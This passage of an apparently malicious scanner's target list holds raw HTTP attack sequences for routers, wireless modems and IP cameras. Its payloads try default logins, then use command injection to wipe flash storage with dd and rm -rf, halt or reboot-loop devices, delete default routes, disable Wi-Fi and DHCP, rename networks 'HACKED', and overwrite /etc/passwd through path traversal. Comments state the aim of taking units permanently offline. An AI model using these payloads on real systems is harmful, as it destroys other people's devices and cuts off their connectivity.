		'POST /ajax.cgi?action=manage_snmp HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nsid=%%CUSTOM1%%&SNMPD_ENABLE=1&ROCOMMUNITY=%60rm+-rf+/*%60&RWCOMMUNITY=&SYSCONTACT=&SYSLOCATION=&btnSubmit=1',
		# reboot loop DDNS payload
		'POST /ajax.cgi?action=net_ddns HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nsid=%%CUSTOM1%%&DDNS_ENABLE=on&DDNS_PROVIDER=0&DDNS_TYPE=0&DDNS_HOST=%60reboot%60&DDNS_DOMAIN=hacked&DDNS_USERNAME=hacked&DDNS_PASSWORD=hacked&btnSubmit=1', 
		# anything still running we should investigate further
		'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
	],

  # BSNL Pointmax with the mtguest/mtguest stuff ?  MediaTek Inc .. Wateen Wimax, Linkem etc.
  [ 'mediatekwimax', '302 Found.*Server: httpd.*Location: login.html',
    'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=admin&PASSWORD=admin',
    'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=user&PASSWORD=user',
    'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=guest&PASSWORD=guest',
    'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=guest&PASSWORD=linkem123',
    # get index
    'GET /index.html?WWW_SID=%%CUSTOM1%% HTTP/1.0\r\n\r\n',
    # switch off dhcp
    'POST /user.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nWWW_SID=%%CUSTOM1%%&REDIRECT=net-lan.html&SERVICE=dhcpd&DHCPD_STATIC_LEASE=&DHCPD_DNS=0%2C0.0.0.0+1%2C0.0.0.0+1%2C0.0.0.0&DHCPD_ENABLE=0&DHCPD_START_IP=192.168.0.2&DHCPD_END_IP=192.168.0.254&DHCPD_LEASE_TIME=1440&DHCPD_RELAY_IP=0.0.0.0&First_Type=1&Second_Type=1&Third_Type=1',
		# relogin
    'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=%%LOGIN%%&PASSWORD=%%PASSWORD%%',
    # get index
    'GET /index.html?WWW_SID=%%CUSTOM1%% HTTP/1.0\r\n\r\n',
    # switch off wifi
    'POST /mtk.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nWWW_SID=%%CUSTOM1%%&REDIRECT=wifi-wlan.MT5921.html&SERVICE=wifi&SLEEP=7&WLAN_WifiEnable=0&WLAN_WscAction=&WLAN_WscConfMode=&WLAN_AuthMode=&WLAN_DefaultKeyID=1%3B1%3B&WLAN_EncrypType=&WLAN_GenPin=&WLAN_WscConfStatus=1&WLAN_SSID1=HACKED&WLAN_SSID2=MTK2',
    # user.cgi alt
    'POST /user.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nWWW_SID=%%CUSTOM1%%&REDIRECT=wifi-wlan.MT5921.html&SERVICE=wifi&SLEEP=7&WLAN_WifiEnable=0&WLAN_WscAction=&WLAN_WscConfMode=&WLAN_AuthMode=&WLAN_DefaultKeyID=1%3B1%3B&WLAN_EncrypType=&WLAN_GenPin=&WLAN_WscConfStatus=1&WLAN_SSID1=HACKED&WLAN_SSID2=MTK2',
		# relogin
    'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=%%LOGIN%%&PASSWORD=%%PASSWORD%%',
    # get index
    'GET /index.html?WWW_SID=%%CUSTOM1%% HTTP/1.0\r\n\r\n',
    # bogus DMZ
    'POST /user.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nWWW_SID=%%CUSTOM1%%&REDIRECT=adv-nat.html&SERVICE=netfilter_dmz&NETFILTER_DMZ_ENABLE=1&NETFILTER_DMZ_HOST=8.8.8.8',
		# relogin
    'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=%%LOGIN%%&PASSWORD=%%PASSWORD%%',
    # get index
    'GET /index.html?WWW_SID=%%CUSTOM1%% HTTP/1.0\r\n\r\n',
    # bogus lan ip 
    'POST /user.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nWWW_SID=%%CUSTOM1%%&REDIRECT=net-lan.html&SLEEP=3&SERVICE=networking_lan&LAN_IP=10.%%RAND16%%&LAN_MASK=255.255.255.254',
    # disable potential voip stuff
    'POST /voip_ip_zyims.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nWWW_SID=%%CUSTOM1%%&REDIRECT=zysc-acct.html%3Find%3D1&SERVICE=sc&SUC_RET=3&ACTION=disconnect&ACCT=1',
    'POST /voip_ip_zyims.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nWWW_SID=%%CUSTOM1%%&REDIRECT=zysc-acct.html%3Find%3D1&SERVICE=sc&SUC_RET=3&ACTION=disconnect&ACCT=2',
    # now attempt some RCEs which seem to mess up some units
		# relogin
    'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=%%LOGIN%%&PASSWORD=%%PASSWORD%%',
    # get index
    'GET /index.html?WWW_SID=%%CUSTOM1%% HTTP/1.0\r\n\r\n',
    'POST /mtk.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nWWW_SID=%%CUSTOM1%%&REDIRECT=sys-log.html&SLEEP=1&SERVICE=sysklogd&SYSLOGD_LOG_ENABLE=1&SYSLOGD_REMOTE_LOG=1&LOG_ENABLE=on&SYSLOGD_LOG_LEVEL=7&REMOTE_LOG=on&SYSLOGD_REMOTE_HOST=%60reboot%60&SYSLOGD_REMOTE_PORT=514',
		# relogin
    'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=%%LOGIN%%&PASSWORD=%%PASSWORD%%',
    # get index
    'GET /index.html?WWW_SID=%%CUSTOM1%% HTTP/1.0\r\n\r\n',
    # DDNS RCE
    'POST /user.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nWWW_SID=%%CUSTOM1%%&REDIRECT=net-ddns.html&DDNS_ENABLE=1&DDNS_WILDCARD=1&DDNS_BACKUP_MX=0&DDNS_MX=0&SERVICE=ddns&DDNS_PROVIDER=0&DDNS_TYPE=0&DDNS_HOST=%60reboot%60&DDNS_DOMAIN=hacked&DDNS_USERNAME=hacked&DDNS_PASSWORD=hacked&DDNS_IPPOLICY=0',
		# relogin
    'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=%%LOGIN%%&PASSWORD=%%PASSWORD%%',
    # get index
    'GET /index.html?WWW_SID=%%CUSTOM1%% HTTP/1.0\r\n\r\n',
    # try RCE again using user.cgi
    'POST /user.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nWWW_SID=%%CUSTOM1%%&REDIRECT=sys-log.html&SLEEP=1&SERVICE=sysklogd&SYSLOGD_LOG_ENABLE=1&SYSLOGD_REMOTE_LOG=1&LOG_ENABLE=on&SYSLOGD_LOG_LEVEL=7&REMOTE_LOG=on&SYSLOGD_REMOTE_HOST=%60reboot%60&SYSLOGD_REMOTE_PORT=514',
		# wimax unauth if device is still up
    'POST /wmx_auth.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nWWW_SID=%%CUSTOM1%%&REDIRECT=wmx-profile.html&SLEEP=1&WMX_AUTH_MODE=0',
		# relogin
    'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=%%LOGIN%%&PASSWORD=%%PASSWORD%%',
    # get index
    'GET /index.html?WWW_SID=%%CUSTOM1%% HTTP/1.0\r\n\r\n',
		# reboot unit to clear connections
    'POST /reboot.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nWWW_SID=%%CUSTOM1%%',
#    'POST /factory.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nWWW_SID=%%CUSTOM1%%&REDIRECT=reboot.html',
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
  ],
	
  # Mediatek units with rpc.cgi, first seen as Telkom-branded D-link DWR-730
  [ 'mediatekrpc', '302 Found.*Server: httpd.*Location: login\.asp',
    'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=admin&PASSWORD=admin&REDIRECT=index.asp&REDIRECT_ERR=login.asp',
    'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=user&PASSWORD=user&REDIRECT=index.asp&REDIRECT_ERR=login.asp',
    'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=guest&PASSWORD=guest&REDIRECT=index.asp&REDIRECT_ERR=login.asp',
    # get index
    'GET /index.asp?WWW_SID=%%CUSTOM1%% HTTP/1.0\r\n\r\n',
    # switch off dhcp
    'POST /rpc.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nCOUNT=9&WWW_SID=%%CUSTOM1%%&ACTION_1=sncfgSet&NAME_1=DHCPD_ENABLE&VALUE_1=0&ACTION_2=sncfgSet&NAME_2=DHCPD_START_IP&VALUE_2=192.168.0.100&ACTION_3=sncfgSet&NAME_3=DHCPD_END_IP&VALUE_3=192.168.0.199&ACTION_4=sncfgSet&NAME_4=DHCPD_LEASE_TIME&VALUE_4=1440&ACTION_5=sncfgSet&NAME_5=DHCPD_RELAY_IP&VALUE_5=0.0.0.0&ACTION_6=sncfgSet&NAME_6=DHCPD_METRIC&VALUE_6=30&ACTION_7=service&NAME_7=dhcpd&VALUE_7=reload&ACTION_8=service&NAME_8=lan&VALUE_8=reload&ACTION_9=service&NAME_9=wifi&VALUE_9=reload',
		# relogin
    'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=%%LOGIN%%&PASSWORD=%%PASSWORD%%&REDIRECT=index.asp&REDIRECT_ERR=login.asp',
    # get index
    'GET /index.asp?WWW_SID=%%CUSTOM1%% HTTP/1.0\r\n\r\n',
    # switch off wifi
    'POST /rpc.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nCOUNT=25&WWW_SID=%%CUSTOM1%%&ACTION_1=sncfgSet&NAME_1=WLAN_Channel&VALUE_1=6&ACTION_2=sncfgSet&NAME_2=WLAN_WirelessMode&VALUE_2=9&ACTION_3=sncfgSet&NAME_3=WLAN_TXPOWER_NOR&VALUE_3=10&ACTION_4=sncfgSet&NAME_4=WLAN_BeaconPeriod&VALUE_4=100&ACTION_5=sncfgSet&NAME_5=WLAN_DtimPeriod&VALUE_5=1&ACTION_6=sncfgSet&NAME_6=WLAN_SSID1&VALUE_6=HACKED&ACTION_7=sncfgSet&NAME_7=ManualSetSSID&VALUE_7=1&ACTION_8=sncfgSet&NAME_8=WLAN_EncrypType&VALUE_8=AES%3B&ACTION_9=sncfgSet&NAME_9=WLAN_AuthMode&VALUE_9=WPA2PSK%3B&ACTION_10=sncfgSet&NAME_10=WLAN_HideSSID&VALUE_10=0%3B&ACTION_11=sncfgSet&NAME_11=WLAN_DefaultKeyID&VALUE_11=&ACTION_12=sncfgSet&NAME_12=WLAN_Key1Type&VALUE_12=&ACTION_13=sncfgSet&NAME_13=WLAN_Key2Type&VALUE_13=&ACTION_14=sncfgSet&NAME_14=WLAN_Key3Type&VALUE_14=&ACTION_15=sncfgSet&NAME_15=WLAN_Key4Type&VALUE_15=&ACTION_16=sncfgSet&NAME_16=WLAN_WAPIPassType&VALUE_16=1%3B&ACTION_17=sncfgSet&NAME_17=WLAN_WPAPSK1&VALUE_17=XnSKDUJjRL&ACTION_18=sncfgSet&NAME_18=WLAN_Key1Str1&VALUE_18=XnSKDUJjRL&ACTION_19=sncfgSet&NAME_19=WLAN_Key2Str1&VALUE_19=XnSKDUJjRL&ACTION_20=sncfgSet&NAME_20=WLAN_Key3Str1&VALUE_20=XnSKDUJjRL&ACTION_21=sncfgSet&NAME_21=WLAN_Key4Str1&VALUE_21=XnSKDUJjRL&ACTION_22=sncfgSet&NAME_22=WLAN_WAPIPassword1&VALUE_22=XnSKDUJjRL&ACTION_23=sncfgSet&NAME_23=WLAN_HT_BW&VALUE_23=0&ACTION_24=sncfgSet&NAME_24=WLAN_SecondChannel&VALUE_24=0&ACTION_25=service&NAME_25=wifi&VALUE_25=switch',
		# relogin
    'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=%%LOGIN%%&PASSWORD=%%PASSWORD%%&REDIRECT=index.asp&REDIRECT_ERR=login.asp',
    # get index
    'GET /index.asp?WWW_SID=%%CUSTOM1%% HTTP/1.0\r\n\r\n',
    # bogus lan ip 
    'POST /rpc.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nCOUNT=6&WWW_SID=%%CUSTOM1%%&ACTION_1=sncfgSet&NAME_1=LAN_IP&VALUE_1=10.%%RAND8%%&ACTION_2=sncfgSet&NAME_2=LAN_MASK&VALUE_2=255.255.255.0&ACTION_3=service&NAME_3=lan&VALUE_3=reload&ACTION_4=sncfgSet&NAME_4=DNSPROXY_DEVICE_NAME&VALUE_4=hacked.modem&ACTION_5=service&NAME_5=totd&VALUE_5=reload&ACTION_6=service&NAME_6=wifi&VALUE_6=reload',
    # now attempt additional RCEs which seem to mess up some units
		# relogin
    'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=%%LOGIN%%&PASSWORD=%%PASSWORD%%&REDIRECT=index.asp&REDIRECT_ERR=login.asp',
    # get index
    'GET /index.asp?WWW_SID=%%CUSTOM1%% HTTP/1.0\r\n\r\n',
    # NTP setting RCE route del default
    'POST /rpc.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nCOUNT=4&WWW_SID=%%CUSTOM1%%&ACTION_1=sncfgSet&NAME_1=DHCPD_NTP&VALUE_1=2%2C%60route%20del%20default%60+0%2C0.0.0.0+0%2C0.0.0.0&ACTION_2=service&NAME_2=dhcpd&VALUE_2=reload&ACTION_3=service&NAME_3=lan&VALUE_3=reload&ACTION_4=service&NAME_4=wifi&VALUE_4=reload',
		# relogin
    'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=%%LOGIN%%&PASSWORD=%%PASSWORD%%&REDIRECT=index.asp&REDIRECT_ERR=login.asp',
    # get index
    'GET /index.asp?WWW_SID=%%CUSTOM1%% HTTP/1.0\r\n\r\n',
    # DNS setting RCE route del default
    'POST /rpc.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nCOUNT=3&WWW_SID=%%CUSTOM1%%&ACTION_1=sncfgSet&NAME_1=DNSPROXY_DEVICE_NAME&VALUE_1=%60route%20del%20default%60&ACTION_2=service&NAME_2=totd&VALUE_2=reload&ACTION_3=service&NAME_3=wifi&VALUE_3=reload',
		# relogin
    'POST /login.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nID=%%LOGIN%%&PASSWORD=%%PASSWORD%%&REDIRECT=index.asp&REDIRECT_ERR=login.asp',
    # get index
    'GET /index.asp?WWW_SID=%%CUSTOM1%% HTTP/1.0\r\n\r\n',
    # DNS setting RCE reboot
    'POST /rpc.cgi HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nCOUNT=3&WWW_SID=%%CUSTOM1%%&ACTION_1=sncfgSet&NAME_1=DNSPROXY_DEVICE_NAME&VALUE_1=%60reboot%60&ACTION_2=service&NAME_2=totd&VALUE_2=reload&ACTION_3=service&NAME_3=wifi&VALUE_3=reload',
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
  ],
	
	[ 'mdmweb', 'Server: lighttpd.*xmlns=.*;<title></title>;.*href=include/style.css', 
	  'POST /cgi-bin/qcmap_auth HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: %%BODYLENGTH%%\r\n\r\ntype=login&pwd=21232f297a57a5a743894a0e4a801fc3&timeout=300&user=admin',
	  'POST /cgi-bin/qcmap_auth HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: %%BODYLENGTH%%\r\n\r\ntype=login&pwd=admin&timeout=300&user=admin',
# should not DC
	  'POST /cgi-bin/qcmap_web_cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nPage=SetMobileAP&mask=2&autoconnect=0&autoconnect_result=0&roaming=0&roaming_result=0&token=%%CUSTOM1%%',
	  'POST /cgi-bin/qcmap_web_cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nPage=ModifyProfile&mask=0&type=1&index=0&name=EVO&apn=default.hacked&username=default.hacked&password=default.hacked&auth_protocol=0&pdn_type=1&rat_type=3&pdn_level_user=&pdn_level_password=&pdn_level_label=&pdn_level_auth_type=0&token=%%CUSTOM1%%',
	  'POST /cgi-bin/qcmap_web_cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nPage=SetWLANConfig&mask=0&wifi_enable=0&wifi_ssid=DEFAULT_PW&wifi_hide=0&wifi_band=1&wifi_mode=2&wifi_channel=0&wifi_max_clients=10&wifi_EncrypType=3&wifi_AuthMode=1&wifi_wep_default_key=&wifi_wep_key_len=&wifi_Key1Type=&wifi_Key1Str1=&wifi_Key2Type=&wifi_Key2Str1=&wifi_Key3Type=&wifi_Key3Str1=&wifi_Key4Type=&wifi_Key4Str1=&wifi_wpa_password=%%RAND8%%&wifi_wapi_key_type=0&wifi_wapi_key=&wifi_HT_BW=0&wifi_SecondChannel=1&wifi_beaconPeriod=20&wifi_dtimPeriod=1&token=%%CUSTOM1%%',
# could DC
	  'POST /cgi-bin/qcmap_web_cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nPage=SetLanConfig&Mask=1&lan_gw_addrs=192.168.%%RAND16%%&lan_sub=255.255.255.254&lan_dhcp=1&lan_dhcp_start=192.168.%%COMP16%%&lan_dhcp_end=192.168.%%COMP16%%&lan_dhcp_lease=30&token=%%CUSTOM1%%',
# likely DC, set to HDR only
	  'POST /cgi-bin/qcmap_web_cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nPage=SetNetworkMode&mask=0&mode=2&token=%%CUSTOM1%%',
    'GET / HTTP/1.0\r\n\r\n',
	],

  # just prepping unit and passing details downstream, no evidence that the subsequent mtd write attempt actually works.. 
  # but who could resist a chance to make a pun :P
  [ 'airosfile', 'Cookie: AIR',
  	'POST /login.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: multipart/form-data; boundary=XXX\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n--XXX\r\nContent-Disposition: form-data; name="passwd"; filename="../../etc/passwd"\r\n\r\ntest:D/jrO7OLO39l.:0:0:Administrator:/etc/persistent:/bin/sh\r\n--XXX--\r\n',
		'POST /login.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: multipart/form-data; boundary=XXX\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n--XXX\r\nContent-Disposition: form-data; name="passwd"; filename="../../dev/mtdblock5"\r\n\r\nr\n--XXX--\r\n',
		'POST /login.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: multipart/form-data; boundary=XXX\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n--XXX\r\nContent-Disposition: form-data; name="passwd"; filename="../../dev/mtdblock4"\r\n\r\nr\n--XXX--\r\n',
		'POST /login.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: multipart/form-data; boundary=XXX\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n--XXX\r\nContent-Disposition: form-data; name="passwd"; filename="../../dev/mtdblock6"\r\n\r\nr\n--XXX--\r\n',
		'POST /login.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: multipart/form-data; boundary=XXX\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n--XXX\r\nContent-Disposition: form-data; name="passwd"; filename="../../dev/mem"\r\n\r\nr\n--XXX--\r\n',
    'GET / HTTP/1.0\r\n\r\n',
 	],

	[ 'xionghash', 'Server: uc-httpd', 
	  'GET ../../../../../mnt/mtd/Config/Account1 HTTP/1.0\r\n\r\n',
	  'xtsxpand:iris_small:1',
	  'xtsxpand:focus_near:1',
	  'xtsxpand:zoom_tile:1',
	  'xtsxpand:direction_down:1',
	  'xnrxpand:irissmall:1',
	  'xnrxpand:focusnear:1',
	  'xnrxpand:zoomtile:1',
	  'xnrxpand:directiondown:1',
	  
	  'xtsxpand:iris_small:2',
	  'xtsxpand:focus_near:2',
	  'xtsxpand:zoom_tile:2',
	  'xtsxpand:direction_down:2',
	  'xnrxpand:irissmall:2',
	  'xnrxpand:focusnear:2',
	  'xnrxpand:zoomtile:2',
	  'xnrxpand:directiondown:2',
	  
	  'xtsxpand:iris_small:3',
	  'xtsxpand:focus_near:3',
	  'xtsxpand:zoom_tile:3',
	  'xtsxpand:direction_down:3',
	  'xnrxpand:irissmall:3',
	  'xnrxpand:focusnear:3',
	  'xnrxpand:zoomtile:3',
	  'xnrxpand:directiondown:3',
	  
		'GET / HTTP/1.0\r\n\r\n',
	],
	
# didn't find anything in 24+h of scanning, waste
#	[ 'kguard', '%%%PORT:9000:',
#		'REMOTE HI_SRDK_DEV_SaveFlash MCTP/1.0\r\nCSeq:%%RAND83%%\r\nAccept:text/HDP\r\nContent-Type:text/HDP\r\nFunc-Version:0x10\r\nContent-Length:15\r\n\r\nSegment-Num:0\r\n',
#		'GET / HTTP/1.0\r\n\r\n',
#	],

  # draytek RCE, on vuln systems this seq will result in 500s before things go perm offline.. maybe mod
  [ 'vigorweb', 'Server: DWS',
		'POST /cgi-bin/mainfunction.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Length: %%BODYLENGTH%%\r\nConnection: close\r\n\r\naction=login&keyPath=%27%0A%2fbin%2fdd${IFS}if%3d%2fdev%2fzero${IFS}of%3d%2fdev%2fmtdblock7%0A%27&loginUser=a&loginPwd=a',
		'POST /cgi-bin/mainfunction.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Length: %%BODYLENGTH%%\r\nConnection: close\r\n\r\naction=login&keyPath=%27%0A%2fbin%2fdd${IFS}if%3d%2fdev%2fzero${IFS}of%3d%2fdev%2fmtdblock0%0A%27&loginUser=a&loginPwd=a',
		'POST /cgi-bin/mainfunction.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Length: %%BODYLENGTH%%\r\nConnection: close\r\n\r\naction=login&keyPath=%27%0A%2fbin%2fdd${IFS}if%3d%2fdev%2fzero${IFS}of%3d%2fdev%2fmtdblock1%0A%27&loginUser=a&loginPwd=a',
		'POST /cgi-bin/mainfunction.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Length: %%BODYLENGTH%%\r\nConnection: close\r\n\r\naction=login&keyPath=%27%0A%2fbin%2fdd${IFS}if%3d%2fdev%2fzero${IFS}of%3d%2fdev%2fmtdblock2%0A%27&loginUser=a&loginPwd=a',
		'POST /cgi-bin/mainfunction.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Length: %%BODYLENGTH%%\r\nConnection: close\r\n\r\naction=login&keyPath=%27%0A%2fbin%2fdd${IFS}if%3d%2fdev%2fzero${IFS}of%3d%2fdev%2fmtdblock3%0A%27&loginUser=a&loginPwd=a',
		'POST /cgi-bin/mainfunction.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Length: %%BODYLENGTH%%\r\nConnection: close\r\n\r\naction=login&keyPath=%27%0A%2fbin%2fdd${IFS}if%3d%2fdev%2fzero${IFS}of%3d%2fdev%2fmtdblock4%0A%27&loginUser=a&loginPwd=a',
		'POST /cgi-bin/mainfunction.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Length: %%BODYLENGTH%%\r\nConnection: close\r\n\r\naction=login&keyPath=%27%0A%2fbin%2fdd${IFS}if%3d%2fdev%2fzero${IFS}of%3d%2fdev%2fmtdblock5%0A%27&loginUser=a&loginPwd=a',
		'POST /cgi-bin/mainfunction.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Length: %%BODYLENGTH%%\r\nConnection: close\r\n\r\naction=login&keyPath=%27%0A%2fbin%2fdd${IFS}if%3d%2fdev%2fzero${IFS}of%3d%2fdev%2fmtdblock6%0A%27&loginUser=a&loginPwd=a',
		'POST /cgi-bin/mainfunction.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Length: %%BODYLENGTH%%\r\nConnection: close\r\n\r\naction=login&keyPath=%27%0A%2fbin%2froute${IFS}del${IFS}default%0A%27&loginUser=a&loginPwd=a',
		'POST /cgi-bin/mainfunction.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Length: %%BODYLENGTH%%\r\nConnection: close\r\n\r\naction=login&keyPath=%27%0A%2fbin%2fhalt%0A%27&loginUser=a&loginPwd=a',
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
	],

  # ACtion Intelbras 1200 series.. randomly stumbled on these.. RCE but needs auth, trying default
	[ 'intelbras1200', 'Redirect;Server: Http Server', 
		'POST /login/Auth HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: %%BODYLENGTH%%\r\nConnection: close\r\n\r\nusername=admin&password=21232f297a57a5a743894a0e4a801fc3',
		'POST /goform/setMacFilterCfg HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: %%BODYLENGTH%%\r\nConnection: keep-alive\r\nCookie: %%CUSTOM1%%\r\n\r\nmacFilterType=white&deviceList=',
		'POST /goform/SetDDNSCfg HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: %%BODYLENGTH%%\r\nConnection: keep-alive\r\nCookie: %%CUSTOM1%%\r\n\r\nddnsEn=1&serverName=dyn.com%2Fdns%2F&ddnsUser=%60cat%20%2Fdev%2Fzero%3E%2Fdev%2Froot%3Bhalt%60&ddnsPwd=dGVzdA%3D%3D&ddnsDomain=test.com',
